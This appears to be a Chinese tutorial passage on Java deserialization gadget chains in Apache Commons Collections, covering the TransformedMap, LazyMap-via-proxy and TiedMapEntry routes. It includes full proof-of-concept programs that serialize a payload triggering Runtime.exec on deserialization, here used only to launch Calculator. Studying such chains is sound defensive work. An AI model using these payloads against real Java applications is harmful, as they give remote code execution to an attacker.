<p><img decoding="async" loading="lazy" alt="image-20210803145548792" src="/assets/images/image-20210803145548792-25ad317fd91983dcca4a4ed67955da53.png" width="1912" height="906" class="img_ev3q"></p>
<p>使用方法<code>input</code>，返回类型是<code>String</code>，所以我们创建的<code>innerMap</code>的put的键值对中，键是<code>input</code></p>
<p>由于<code>var7.isInstance(var8) ==&gt; false</code>，所以我们<code>innerMap</code>的put的键值对中的值类型不能是<code>String</code></p>
<p>所以构造如下：</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Map innerMap = new HashMap();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">innerMap.put(&quot;input&quot;, 1);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br></span></code></pre></div></div>
<p>运行</p>
<p><img decoding="async" loading="lazy" alt="image-20210803150327688" src="/assets/images/image-20210803150327688-98fe758e1e86f4fc0ad2d605e1032f7a.png" width="3520" height="1692" class="img_ev3q"></p>
<p>成功反序列化执行了命令。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="完整poc">完整POC<a href="#完整poc" class="hash-link" aria-label="完整POC的直接链接" title="完整POC的直接链接">​</a></h4>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.Transformer;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.functors.ChainedTransformer;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.functors.ConstantTransformer;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.functors.InvokerTransformer;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.map.TransformedMap;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.xml.ws.Action;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.*;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.reflect.Constructor;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.reflect.InvocationTargetException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.util.Arrays;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.util.HashMap;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.util.Map;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class App {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(String.class.isInstance(&quot;&quot;));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 利用链</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Transformer[] transformers = new Transformer[]{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new ConstantTransformer(Runtime.class),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open -na Calculator&quot;})</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        };</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Map innerMap = new HashMap();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        innerMap.put(&quot;input&quot;, 1);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 构建对象</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        constructor.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Object o = constructor.newInstance(Action.class, outerMap);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 序列化</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        objectOutputStream.writeObject(o);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        objectOutputStream.close();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray()));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 反序列化</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        objectInputStream.readObject();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="整体思路">整体思路<a href="#整体思路" class="hash-link" aria-label="整体思路的直接链接" title="整体思路的直接链接">​</a></h4>
<p>我们构造恶意的<code>AnnotationInvocationHandler</code>类，将该类的成员变量<code>memberValues</code>赋值为我们精心构造的**<code>TransformedMap</code><strong>对象，并将<code>AnnotationInvocationHandler</code>类进行序列化，然后交给目标JAVA  WEB应用进行反序列化。在进行反序列化时，会执行<code>readObject()</code>方法，该方法会对成员变量</strong><code>TransformedMap</code>**的<code>Value</code>值进行修改，该修改触发了<code>TransformedMap</code>实例化时传入的参数<code>InvokerTransformer</code>的<code>transform()</code>方法，<code>InvokerTransformer.transform()</code>方法通过反射链调用<code>Runtime.getRuntime.exec(“xx”)</code>函数来执行系统命令。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="使用lazymap利用链">使用LazyMap利用链<a href="#使用lazymap利用链" class="hash-link" aria-label="使用LazyMap利用链的直接链接" title="使用LazyMap利用链的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="介绍">介绍<a href="#介绍" class="hash-link" aria-label="介绍的直接链接" title="介绍的直接链接">​</a></h4>
<p><code>LazyMap</code>和<code>TransformedMap</code>类似，都继承 <code>AbstractMapDecorator</code>。</p>
<p><img decoding="async" loading="lazy" alt="image-20210803155104437" src="/assets/images/image-20210803155104437-872b358e5f2a667a4a1013b08ac4ba2d.png" width="1250" height="686" class="img_ev3q"></p>
<p>而<code>TransformedMap</code>是在写入元素的时候执行<code>transform</code>方法，<code>LazyMap</code>是在其<code>get</code>方法中执行的 <code>this.factory.transform</code>。</p>
<p><code>LazyMap</code>的作用是“懒加载”，在get找不到值的时候，它会调用 <code>this.factory.transform</code> 方法去获取一个值</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">public Object get(Object key) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if (!super.map.containsKey(key)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Object value = this.factory.transform(key);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            super.map.put(key, value);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return value;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return super.map.get(key);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span></code></pre></div></div>
<p>而<code>this.factory</code>也是我们可以控制的，在构造函数中。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">protected LazyMap(Map map, Transformer factory) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    super(map);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if (factory == null) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        throw new IllegalArgumentException(&quot;Factory must not be null&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    } else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        this.factory = factory;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>所以构造poc的时候只要令<code>factory</code>为精心构造的<code>ChainedTransformer</code>就行，因此我们找一下哪里可能调用了<code>LazyMap</code>的<code>get</code>方法。</p>
<p>但是我们在<code>AnnotationInvocationHandler#readObject</code>函数中并没有看到有执行<code>get方法</code>，所以ysoserial找到了另一条路，<code>AnnotationInvocationHandler</code>类的<code>invoke方法</code>有调用到<code>get</code>：</p>
<p><img decoding="async" loading="lazy" alt="image-20210803160149440" src="/assets/images/image-20210803160149440-49d80f536ec0de64e08f64c74fdeadb1.png" width="1638" height="1256" class="img_ev3q"></p>
<p><code>AnnotationInvocationHandler#invoke</code>看到<code>invoke</code>方向就大概联想到Java的动态代理机制。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="动态代理复习">动态代理复习<a href="#动态代理复习" class="hash-link" aria-label="动态代理复习的直接链接" title="动态代理复习的直接链接">​</a></h4>
<blockquote>
<p>总结为一句话就是，被动态代理的对象调用任意方法都会通过对应的InvocationHandler的invoke方法触发</p>
</blockquote>
<hr>
<p>这里再举个例子说明一下如何自动调用的<code>invoke</code>方法</p>
<blockquote>
<p>InvocationHandlerExample.class</p>
</blockquote>
<p><code>InvocationHandlerExample类</code>继承了<code>InvocationHandler</code>，实现了<code>invoke</code>方法，作用是在监控到调用的方法名是get的时候，返回一个特殊字符串 Hacked Object 。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.reflect.InvocationHandler;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.reflect.Method;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.util.Map;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class InvocationHandlerExample implements InvocationHandler {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    protected Map map;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public InvocationHandlerExample(Map map){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        this.map = map;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if (method.getName().compareTo(&quot;get&quot;) == 0){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            System.out.println(&quot;HOOK Method: &quot; + method.getName());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return &quot;Hacked Object&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return method.invoke(this.map, args);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<blockquote>
<p>App.class</p>
</blockquote>
<p>在App类中调用这个<code>InvocationHandlerExample</code></p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.reflect.InvocationHandler;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.reflect.Proxy;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.util.HashMap;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.util.Map;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class App {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        InvocationHandler handler = new InvocationHandlerExample(new HashMap());	// 代理类的逻辑</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        proxyMap.put(&quot;1&quot;, &quot;2&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(proxyMap.get(&quot;1&quot;));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20210803165919351" src="/assets/images/image-20210803165919351-d6f58a77f7a5776d24b925fed5501f21.png" width="1998" height="1684" class="img_ev3q"></p>
<p>可以看到调用的<code>get</code>方法，但是被我们动态代理中的<code>invoke</code>方法拦截了，返回了<code>Hacked Object</code></p>
<p>也就是说这个Map对象经过动态代理处理之后，<strong>动态代理对象调用任何一个方法时会调用<code>handler</code>中的<code>invoke</code>方法</strong>。</p>
<hr>
<p>我们回看<code>sun.reflect.annotation.AnnotationInvocationHandler</code>，会发现实际上这个类实际就是一个<code>InvocationHandler</code>，我们如果将这个对象用Proxy进行代理，那么在<code>readObject</code>的时候，只要调用任意方法，就会进入到<code>AnnotationInvocationHandler#invoke</code>方法中，进而触发我们的<code>LazyMap#get</code>。</p>
<p><img decoding="async" loading="lazy" alt="image-20210803170250433" src="/assets/images/image-20210803170250433-c9a2a310c3af3b618312904795424203.png" width="1542" height="1250" class="img_ev3q"></p>
<p>所以我们只要创建一个<code>LazyMap</code>的动态代理，然后再用动态代理调用<code>LazyMap</code>的某个方法就行了，但是为了反序列化的时候自动触发，我们应该找的是某个重写了<code>readObject</code>方法的类，这个类的<code>readObject</code>方法中可以通过动态代理调用<code>LazyMap</code>的某个方法，其实这和直接调用<code>LazyMap</code>某个方法需要满足的条件几乎是一样的，因为某个类的动态代理与它本身实现了同一个接口。而我们通过分析<code>TransformedMap</code>利用链的时候，已经知道了<strong>在<code>AnnotationInvocationHandler</code>的<code>readObject</code>方法中会调用某个<code>Map</code>类型对象的<code>entrySet()</code>方法，而<code>LazyMap</code>以及他的动态代理都是<code>Map</code>类型</strong>，所以，一条利用链就这么出来了</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="构建poc">构建POC<a href="#构建poc" class="hash-link" aria-label="构建POC的直接链接" title="构建POC的直接链接">​</a></h4>
<p>对<code>sun.reflect.annotation.AnnotationInvocationHandler</code>对象进行Proxy</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// 构建对象</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">constructor.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 创建LazyMap的handler实例</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">InvocationHandler handler = (InvocationHandler) constructor.newInstance(Action.class, outerMap);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 创建LazyMap的动态代理实例</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);  // 动态代理对象，执行任意方法，都会到invoke中去</span><br></span></code></pre></div></div>
<p>代理后的对象叫做proxyMap，但我们不能直接对其进行序列化，因为我们入口点是 <code>sun.reflect.annotation.AnnotationInvocationHandler#readObject </code>，所以我们还需要再用<code>AnnotationInvocationHandler</code>对这个proxyMap进行包裹（我们需要的是<code>AnnotationInvocationHandler</code>这个类的对象）</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);	// readObject的时候主动调用proxyMap的方法进入到invoke中</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="完整poc-1">完整POC<a href="#完整poc-1" class="hash-link" aria-label="完整POC的直接链接" title="完整POC的直接链接">​</a></h4>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.Transformer;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.functors.ChainedTransformer;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.functors.ConstantTransformer;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.functors.InvokerTransformer;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.map.LazyMap;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.map.TransformedMap;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.xml.ws.Action;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.*;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.reflect.Constructor;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.reflect.InvocationHandler;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.reflect.InvocationTargetException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.reflect.Proxy;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.util.Arrays;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.util.HashMap;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.util.Map;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class App {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(String.class.isInstance(&quot;&quot;));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 利用链</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Transformer[] transformers = new Transformer[]{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new ConstantTransformer(Runtime.class),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open -na Calculator&quot;})</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        };</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Map innerMap = new HashMap();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        innerMap.put(&quot;input&quot;, 1);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 构建对象</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        constructor.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Action.class, outerMap);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);  // 代理对象</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        handler = (InvocationHandler) constructor.newInstance(Action.class, proxyMap);  // 包裹</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 序列化</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        objectOutputStream.writeObject(handler);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        objectOutputStream.close();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray()));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 反序列化</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        objectInputStream.readObject();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20210803171804619" src="/assets/images/image-20210803171804619-d657dbe6bd3f7c2f6076a140386e3b04.png" width="3582" height="2058" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="lazymap利用链补充">LazyMap利用链补充<a href="#lazymap利用链补充" class="hash-link" aria-label="LazyMap利用链补充的直接链接" title="LazyMap利用链补充的直接链接">​</a></h4>
<p>上面的利用链受限于jdk1.7版本，我们来看一看另外一种利用方式，这条利用链不是用动态代理的方式触发了</p>
<p>从上一条利用链我们已经知道<code>LazyMap</code>类的<code>get方法</code>中调用了<code>transform</code>方法，那么除了<code>AnnotationInvocationHandler</code>的<code>invoke</code>方法中调用了get方法外，还有没有其他的地方也调用了get方法呢?当然有，<code>TiedMapEntry</code>类的<code>getValue</code>方法也调用了<code>get方法</code></p>
<p><img decoding="async" loading="lazy" alt="image-20210805154602919" src="/assets/images/image-20210805154602919-f319d3cb1e069f4f086fc7fb245f4d62.png" width="1344" height="778" class="img_ev3q"></p>
<p>而且<code>this.map</code>我们也可以控制，但是我们最终要找的还是<code>readObject方法</code>中的触发点，所以继续网上找，看看哪里调用了<code>TiedMapEntry</code>的<code>getValue</code>方法，找到<code>TiedMapEntry</code>类的<code>toString</code>方法：</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">public String toString() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return this.getKey() + &quot;=&quot; + this.getValue();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span></code></pre></div></div>
<p><code>toString方法</code>在进行字符串拼接或者手动把某个类转换为字符串的时候会被调用，所以，现在我们找找<strong>把<code>TiedMapEntry</code>的对象当做字符串处理的地方</strong>，找到了<code>BadAttributeValueExpException</code>的<code>readObject</code>方法中有相关调用：</p>
<p><img decoding="async" loading="lazy" alt="image-20210805155221856" src="/assets/images/image-20210805155221856-524093c310ee7e8f9ed9120486705c37.png" width="1768" height="1164" class="img_ev3q"></p>
